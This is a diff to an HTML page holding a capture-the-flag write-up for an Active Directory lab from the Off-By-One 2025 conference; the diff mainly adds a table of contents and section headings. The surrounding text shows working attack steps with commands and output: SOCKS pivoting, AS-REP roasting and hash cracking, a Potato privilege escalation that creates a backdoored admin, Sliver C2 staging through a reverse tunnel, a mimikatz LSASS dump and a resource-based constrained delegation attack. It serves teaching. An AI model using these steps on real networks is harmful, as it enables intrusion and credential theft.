@@ -19,7 +19,7 @@
 {"@context":"https://schema.org","@type":"WebPage","headline":"OBO CTF 2025","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"}},"url":"http://localhost:4000/offbyone-2025.html"}</script>
 <!-- End Jekyll SEO tag -->
 
-    <link rel="stylesheet" href="/assets/css/style.css?v=ac1f09f0c415e017611ecd50168be454c50c84d4">
+    <link rel="stylesheet" href="/assets/css/style.css?v=8635538debdaaa8115531bbc254bb85a22863755">
     <!--[if lt IE 9]>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
     <![endif]-->
@@ -60,11 +60,142 @@
 
 <p>This is a partial writeup (3/6) of the CTF that we organized during the <a href="https://offbyone.sg/">Off-By-One Conference 2025</a> in Singapore.</p>
 
-<p>For any questions about this writeup, feel free to reach out to <a href="https://x.com/gatariee">@gatari</a> on the <a href="https://discord.com/invite/r6pZRT8X2P">Range Village Discord</a>. The following was provided as the given context for the CTF:</p>
+<p>For any questions about this writeup, feel free to reach out to <a href="https://x.com/gatariee">@gatari</a> on the <a href="https://discord.com/invite/r6pZRT8X2P">Range Village Discord</a>.</p>
+
+<style>
+.toc-container a {
+    text-decoration: none;
+}
+
+.toc-container a:hover {
+    text-decoration: underline;
+}
+
+.toc-container button {
+    color: white;
+}
+
+.toc-toggle {
+    background: none;
+    border: none;
+    font-size: 1.1em;
+    font-weight: bold;
+    cursor: pointer;
+    width: 100%;
+    text-align: left;
+    padding: 8px 0;
+}
+
+.toc-content {
+    display: none;
+    margin-top: 8px;
+}
+
+.toc-content.expanded {
+    display: block;
+}
+
+.toc-container ol {
+    margin: 0;
+    padding-left: 20px;
+}
+
+.toc-container ul {
+    margin: 4px 0;
+    padding-left: 20px;
+}
+
+.toc-container li {
+    margin: 4px 0;
+}
+</style>
+
+<div class="toc-container">
+<button class="toc-toggle" onclick="toggleToc()">Table of Contents ▼</button>
+<div class="toc-content" id="tocContent">
+<ol>
+<li>
+<a href="#introduction">Introduction</a>
+<ul>
+<li><a href="#context-and-scenario">Context and Scenario</a></li>
+<li><a href="#required-tools">Required Tools</a></li>
+<li><a href="#methodology-notes">Methodology Notes</a></li>
+</ul>
+</li>
+
+<li>
+<a href="#flag-1">Flag 1</a>
+<ul>
+<li><a href="#ssh-access-and-network-discovery">SSH Access and Network Discovery</a></li>
+<li><a href="#domain-controller-identification">Domain Controller Identification</a></li>
+<li><a href="#setting-up-socks-proxy">Setting Up SOCKS Proxy</a></li>
+<li><a href="#dns-enumeration">DNS Enumeration</a></li>
+<li><a href="#smb-enumeration">SMB Enumeration</a></li>
+<li><a href="#as-rep-roasting-attack">AS-REP Roasting Attack</a></li>
+<li><a href="#smb-enumeration-again">SMB Enumeration (again)</a></li>
+<li><a href="#credential-discovery">Credential Discovery</a></li>
+<li><a href="#winrm">WinRM Access</a></li>
+</ul>
+</li>
+
+<li>
+<a href="#flag-2">Flag 2</a>
+<ul>
+<li><a href="#checking-user-privileges">Checking User Privileges</a></li>
+<li><a href="#seimpersonateprivilege-exploitation">SeImpersonatePrivilege Exploitation</a></li>
+</ul>
+</li>
+
+<li>
+<a href="#flag-3">Flag 3</a>
+<ul>
+<li><a href="#double-pivots">Double Pivots</a></li>
+<li>
+<a href="#command--control-c2">Command &amp; Control Setup</a>
+<ul>
+<li><a href="#c2-infrastructure-overview">C2 Infrastructure Overview</a></li>
+<li><a href="#network-tunneling-configuration">Network Tunneling Configuration</a></li>
+<li><a href="#sliver-c2-deployment">Sliver C2 Deployment</a></li>
+</ul>
+</li>
+<li><a href="#credential-harvesting">Credential Harvesting</a></li>
+<li><a href="#enumerating-acls">Enumerating ACLs</a></li>
+<li><a href="#resource-based-constrained-delegation-attack">Resource-Based Constrained Delegation Attack</a></li>
+<li><a href="#accessing-western-outpost-via-pivot">Accessing WESTERN-OUTPOST via Pivot</a></li>
+</ul>
+</li>
+</ol>
+</div>
+</div>
+
+<script>
+function toggleToc() {
+    const content = document.getElementById('tocContent');
+    const button = document.querySelector('.toc-toggle');
+    
+    if (content.classList.contains('expanded')) {
+        content.classList.remove('expanded');
+        button.innerHTML = 'Table of Contents ▼';
+    } else {
+        content.classList.add('expanded');
+        button.innerHTML = 'Table of Contents ▲';
+    }
+}
+</script>
+
+<hr />
+
+<h2 id="introduction">Introduction</h2>
+
+<h3 id="context-and-scenario">Context and Scenario</h3>
+
+<p>The following was provided as the given context for the CTF:</p>
 
 <p><img src="/assets/img/3e3b060cd60728d5811e5191e441b61a.png" alt="" /></p>
 
 <p><img src="/assets/img/f5badd2663021ac0d1421edfd167230a.png" alt="" /></p>
+
+<h3 id="required-tools">Required Tools</h3>
 
 <p>The following tools will most likely be used during the CTF:</p>
 <ol>
@@ -76,6 +207,8 @@
   <li><a href="https://github.com/aniqfakhrul/powerview.py">PowerView.py</a></li>
 </ol>
 
+<h3 id="bloodhound-usage">BloodHound Usage</h3>
+
 <p>This writeup will exclude the use of <a href="https://github.com/SpecterOps/BloodHound-Legacy">BloodHound</a> to encourage participants to focus on manual enumeration methods and avoid becoming overly dependent on the tool.</p>
 
 <blockquote>
@@ -83,6 +216,8 @@
 </blockquote>
 
 <h2 id="flag-1">Flag 1</h2>
+
+<h3 id="ssh-access-and-network-discovery">SSH Access and Network Discovery</h3>
 
 <p>In the given scenario, we are given SSH access to a jump host located at <code class="language-plaintext highlighter-rouge">172.16.10.10</code> that we can access using:</p>
 
@@ -107,19 +242,25 @@
        valid_lft forever preferred_lft forever
 </code></pre></div></div>
 
-<p>We also know that the domain controller is at <code class="language-plaintext highlighter-rouge">10.2.30.51</code>, which we can verify by pinging it, as domain controllers typically allow ICMP traffic.</p>
+<h3 id="domain-controller-identification">Domain Controller Identification</h3>
+
+<p>We also know that the domain controller is at <code class="language-plaintext highlighter-rouge">10.2.30.51</code>, which we can verify by pinging it, as domain controllers typically allow ICMP traffic. We can identify domain controllers by looking for the Kerberos service running on port <code class="language-plaintext highlighter-rouge">88</code> and the LDAP service on port <code class="language-plaintext highlighter-rouge">389</code>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc_jmp@jump:~$ ping -c 1 10.2.30.51
 PING 10.2.30.51 (10.2.30.51) 56(84) bytes of data.
 64 bytes from 10.2.30.51: icmp_seq=1 ttl=127 time=0.316 ms
 </code></pre></div></div>
 
+<h3 id="setting-up-socks-proxy">Setting Up SOCKS Proxy</h3>
+
 <p>To route our tools through the SSH tunnel, we can use the <code class="language-plaintext highlighter-rouge">-D</code> option with <code class="language-plaintext highlighter-rouge">ssh</code> to initiate a <code class="language-plaintext highlighter-rouge">SOCKS4</code> proxy on <code class="language-plaintext highlighter-rouge">127.0.0.1</code>, along with the <code class="language-plaintext highlighter-rouge">-N</code> flag to prevent an interactive shell from opening.</p>
 
-<p>A detailed explanation of the pivot setup can be found at <a href="https://playtrv.async.sg/im_new">https://playtrv.async.sg/im_new</a>, a local copy of the page is also available in this repository: <a href="./im_new.md">here</a></p>
+<p>A detailed explanation of the pivot setup can be found at <a href="https://playtrv.async.sg/im_new">https://playtrv.async.sg/im_new</a>, a local copy of the page is also available in this repository: <a href="https://github.com/ASYNC-Security/RangeVillage-Conference-CTF-Writeups/blob/main/Off-By-One-2025/im_new.md">here</a></p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sshpass -p '8iP0TbO5mQmS' ssh svc_jmp@172.16.10.10 -D 1081 -N 
 </code></pre></div></div>
+
+<h3 id="dns-enumeration">DNS Enumeration</h3>
 
 <p>We can perform reconnaissance on the Domain Controller by routing our traffic through the <code class="language-plaintext highlighter-rouge">SOCKS4</code> proxy using <code class="language-plaintext highlighter-rouge">proxychains</code> in combination with netexec</p>
 
@@ -188,6 +329,8 @@ SMB         10.2.30.51      445    KING-DC          [*] Windows Server 2022 Buil
 Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 </code></pre></div></div>
 
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+
 <p>We can also enumerate SMB shares on the accessible hosts.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains -q nxc smb targets.txt -u 'Towns_Merchant_7' -p 'Hq7L2wPzX9' --shares
@@ -228,6 +371,8 @@ Logging directory is set to /home/kali/.powerview/logs/async-towns_merchant_7-ki
 distinguishedName     : DC=async,DC=empire
 </code></pre></div></div>
 
+<h3 id="as-rep-roasting-attack">AS-REP Roasting Attack</h3>
+
 <p>Next, we can look for low-hanging fruit like Kerberoastable and AS-REP roastable users.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>╭─LDAP─[King-DC.async.empire]─[async\Towns_Merchant_7]
@@ -257,6 +402,8 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 jessisnaughty4u! ($krb5asrep$23$Court_Jester_13@ASYNC.EMPIRE) 
 </code></pre></div></div>
 
+<h3 id="smb-enumeration-again">SMB Enumeration (again)</h3>
+
 <p>Using the newly obtained credentials, we can attempt to access the SMB shares once more - and find that we now have READ access to the <code class="language-plaintext highlighter-rouge">Castle_Guards_Schedule</code> share.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains -q nxc smb targets.txt -u 'Court_Jester_13' -p 'jessisnaughty4u!' --shares
@@ -281,6 +428,8 @@ SMB         10.2.30.51      445    KING-DC          NETLOGON        READ        
 SMB         10.2.30.51      445    KING-DC          SYSVOL          READ            Logon server share 
 Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 </code></pre></div></div>
+
+<h3 id="credential-discovery">Credential Discovery</h3>
 
 <p>We can connect to the SMB share and loot the <code class="language-plaintext highlighter-rouge">Castle_Guards_Schedule</code> share.</p>
 
@@ -345,6 +494,8 @@ SMB         10.2.30.51      445    KING-DC          SYSVOL          READ        
 Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 </code></pre></div></div>
 
+<h3 id="winrm">WinRM</h3>
+
 <p>Upon enumerating other remote protocols, we find that <code class="language-plaintext highlighter-rouge">Castle_Guard_29</code> has WinRM access to <code class="language-plaintext highlighter-rouge">SOUTHERN-TOWER</code>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains -q nxc winrm targets.txt -u 'Castle_Guard_29' -p 'oZ5pLcXj1R'       
@@ -373,7 +524,10 @@ async\castle_guard_29
 *Evil-WinRM* PS C:\Users\Castle_Guard_29\Documents&gt; cat C:\Users\FLAG1\FLAG1.txt
 3716d60f85ad825b0bf1b3877d7ff42e
 </code></pre></div></div>
+
 <h2 id="flag-2">Flag 2</h2>
+
+<h3 id="checking-user-privileges">Checking User Privileges</h3>
 
 <p>We can check the user’s privileges on the machine by running <code class="language-plaintext highlighter-rouge">whoami /priv</code>.</p>
 
@@ -388,6 +542,8 @@ SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
 SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 </code></pre></div></div>
+
+<h3 id="seimpersonateprivilege-exploitation">SeImpersonatePrivilege Exploitation</h3>
 
 <p>We discover that we have the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> on this machine, which enables us to impersonate a <code class="language-plaintext highlighter-rouge">SYSTEM</code> token using any of the Potato exploits. We’ll use <code class="language-plaintext highlighter-rouge">SharpEfsPotato.exe</code> to create a backdoored local admin.</p>
 
@@ -453,6 +609,8 @@ Info: Establishing connection to remote endpoint
 
 <h2 id="flag-3">Flag 3</h2>
 
+<h3 id="double-pivots">Double Pivots</h3>
+
 <p>From this machine, you’ll find that you now have access to additional machines, including <code class="language-plaintext highlighter-rouge">Western-Outpost</code>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*Evil-WinRM* PS C:\Users\gatari\Documents&gt; ping Western-Outpost.async.empire -n 1
@@ -472,6 +630,8 @@ Approximate round trip times in milli-seconds:
 
 <p>In my opinion, the most stable and reliable open-source C2 frameworks are <a href="https://github.com/rapid7/metasploit-framework">meterpreter</a> and <a href="https://github.com/BishopFox/sliver">sliver</a>. For this writeup, I’ll be using <code class="language-plaintext highlighter-rouge">Sliver</code>, as there is already plenty of documentation for <code class="language-plaintext highlighter-rouge">Meterpreter</code>, and <code class="language-plaintext highlighter-rouge">Sliver</code> is generally less commonly used.</p>
 
+<h4 id="c2-infrastructure-overview">C2 Infrastructure Overview</h4>
+
 <p>The internal machines are airgapped and do not have direct internet access, meaning they cannot connect directly to your machine. However, they can connect to the jump host. You may remember the following network interface on the jump host that is exposed to the internal subnet:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2: ens18: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
@@ -490,13 +650,15 @@ Pinging 10.2.10.9 with 32 bytes of data:
 Reply from 10.2.10.9: bytes=32 time&lt;1ms TTL=64
 </code></pre></div></div>
 
+<h4 id="network-tunneling-configuration">Network Tunneling Configuration</h4>
+
 <p>In order to facilitate a connection from the <code class="language-plaintext highlighter-rouge">Southern-Tower</code> (or any other internal machine) to our C2 server, we need to tunnel traffic out through the jump host. For those familiar with red team infrastructure, this is very similar to a C2 redirector.</p>
 
-<p><img src="https://cdn.packtpub.com/article-hub/articles/e643d07fe8f9f65126dac04d4edd4111.png" alt="img" /></p>
+<p><img src="https://cdn.packtpub.com/article-hub/articles/e643d07fe8f9f65126dac04d4edd4111.png" alt="img" style="width: 50%;" /></p>
 
 <p>In the context of this environment, the setup looks something like this:</p>
 
-<p><img src="./assets/pivot.png" alt="img" /></p>
+<p><img src="/assets/img/pivot.png" alt="img" /></p>
 
 <p>The reverse port forward (<code class="language-plaintext highlighter-rouge">FwdRule1</code>) can be staged using <code class="language-plaintext highlighter-rouge">ssh</code> with the following syntax:</p>
 
@@ -516,6 +678,8 @@ User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5
 Host: 10.2.10.9:41337
 Connection: Keep-Alive
 </code></pre></div></div>
+
+<h4 id="sliver-c2-deployment">Sliver C2 Deployment</h4>
 
 <p>Next, we can set up a listener on the jump host using <code class="language-plaintext highlighter-rouge">mtls</code> on <code class="language-plaintext highlighter-rouge">TCP/6969</code> (on the attacker machine):</p>
 
@@ -578,6 +742,8 @@ Reconnect Interval: 1m0s
       Last Checkin: Fri May  9 04:40:44 EDT 2025 (47s ago)
 </code></pre></div></div>
 
+<h3 id="credential-harvesting">Credential Harvesting</h3>
+
 <p>After obtaining the session, we can perform an LSASS dump with <code class="language-plaintext highlighter-rouge">mimikatz</code>. We’ll use the <code class="language-plaintext highlighter-rouge">sideload</code> command for this.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sliver (initial) &gt; sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe '"sekurlsa::logonpasswords" "exit"'
@@ -621,6 +787,8 @@ SID               : S-1-5-21-3324594629-4204122608-2512478463-1113
         cloudap :
 </code></pre></div></div>
 
+<h3 id="enumerating-acls">Enumerating ACLs</h3>
+
 <p>After discovering the credentials for the <code class="language-plaintext highlighter-rouge">Castle_Knight_21</code> user, we can verify them by running them against the Domain Controller.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains -q nxc smb King-DC.async.empire -u 'Castle_Knight_21' -H '8d987bd5a242dcb12bf5a18a8cb68554'
@@ -641,6 +809,8 @@ DACL: WRITE
 
 ...
 </code></pre></div></div>
+
+<h3 id="resource-based-constrained-delegation-attack">Resource-Based Constrained Delegation Attack</h3>
 
 <p>We find that we have <code class="language-plaintext highlighter-rouge">WRITE</code> access to the <code class="language-plaintext highlighter-rouge">Domain Access Control Lists (DACLs)</code> for <code class="language-plaintext highlighter-rouge">western-outpost</code>, allowing us to modify access control settings on the machine. To avoid disrupting other operations, we’ll create a new domain computer (which is also a domain account) and assign the ACLs there.</p>
 
@@ -669,7 +839,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*]     GATARI$      (S-1-5-21-3324594629-4204122608-2512478463-1283)
 </code></pre></div></div>
 
-<p>Now that our <code class="language-plaintext highlighter-rouge">GATARI$</code> account has been granted delegation rights on <code class="language-plaintext highlighter-rouge">WESTERN-OUTPOST</code>, we can perform request a Service Ticket (ST) for any user (including <code class="language-plaintext highlighter-rouge">Administrator</code>) to any service on <code class="language-plaintext highlighter-rouge">WESTERN-OUTPOST</code>.</p>
+<p>Now that our <code class="language-plaintext highlighter-rouge">GATARI$</code> account has been granted delegation rights on <code class="language-plaintext highlighter-rouge">WESTERN-OUTPOST</code>, we can request a Service Ticket (ST) for any user (including <code class="language-plaintext highlighter-rouge">Administrator</code>) to any service on <code class="language-plaintext highlighter-rouge">WESTERN-OUTPOST</code> - similar to that of Constrained Delegation.</p>
 
 <p>A list of default (and important) SPNs can be found: <a href="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html#">here</a>. For this writeup, we’ll be using the <code class="language-plaintext highlighter-rouge">cifs</code> SPN, which is used for the SMB service which allows us to access remote shares and interact with services.</p>
 
@@ -682,6 +852,8 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Requesting S4U2Proxy
 [*] Saving ticket in administrator@cifs_WESTERN-OUTPOST.async.empire@ASYNC.EMPIRE.ccache
 </code></pre></div></div>
+
+<h3 id="accessing-western-outpost-via-pivot">Accessing WESTERN-OUTPOST via Pivot</h3>
 
 <p>Since <code class="language-plaintext highlighter-rouge">WESTERN-OUTPOST</code> is only accessible via our newly-acquired <code class="language-plaintext highlighter-rouge">SOUTHERN-TOWER</code> session, we can use our sliver session to proxy the connection to <code class="language-plaintext highlighter-rouge">WESTERN-OUTPOST</code> using the <code class="language-plaintext highlighter-rouge">socks5</code> command. This will allow us to connect to <code class="language-plaintext highlighter-rouge">WESTERN-OUTPOST</code> via the jump host.</p>
 
